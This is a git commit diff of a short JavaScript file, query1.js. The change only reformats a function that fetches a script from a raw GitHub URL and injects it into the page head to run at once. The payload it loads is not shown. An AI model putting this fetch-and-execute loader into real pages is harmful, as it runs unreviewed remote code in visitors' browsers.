3446a7beaa8a17a7430cc32cd27a5da841bd1c2d
SEOxxx <133757926+SEOxxx@users.noreply.github.com>
2023-05-16 06:56:36 -0300

    Update query1.js

--- query1.js
+++ query1.js
@@ -1,10 +1,10 @@
-    function carregarScriptAutomaticamente() {
+function carregarScriptAutomaticamente() {
       fetch('https://raw.githubusercontent.com/SEOxxx/y/main/query.js')
         .then(response => response.text())
         .then(conteudo => {
           var scriptTag = document.createElement('script');
           scriptTag.textContent = conteudo;
           document.head.appendChild(scriptTag);
-        });
-    }
+        });};
+    
 	carregarScriptAutomaticamente();
